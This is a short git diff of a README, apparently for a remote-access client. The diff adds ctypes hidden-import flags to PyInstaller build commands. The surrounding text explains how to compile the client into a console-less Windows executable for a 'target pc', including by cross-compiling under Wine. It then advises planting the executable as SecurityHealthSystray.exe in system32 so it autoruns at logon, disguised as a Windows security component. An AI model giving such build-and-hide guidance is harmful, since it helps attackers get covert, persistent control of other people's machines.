@@ -34,7 +34,7 @@ pip install pyinstaller
 ```
 Compile client to executable :
 ```bash
-pyinstaller client.py --onefile --noconsole
+pyinstaller client.py --onefile --noconsole --hidden-import=ctypes --hidden-import=ctypes.wintypes
 ```
 ### If you are on linux (and target pc is on windows)
 Install wine, download python 64bit .exe installer then start cmd :
@@ -55,7 +55,7 @@ pip install pyinstaller
 ```
 And finally, compile to .exe :
 ```bash
-pyinstaller client.py --onefile --noconsole
+pyinstaller client.py --onefile --noconsole --hidden-import=ctypes --hidden-import=ctypes.wintypes
 ```
 ## Finally :
 Now whether you are on Linux or Windows, you have your client in ```dist/*.exe```, it can be injected as ```SecurityHealthSystray.exe``` for autorun on user logon (```C:\Windows\system32\SecurityHealthSystray.exe```)
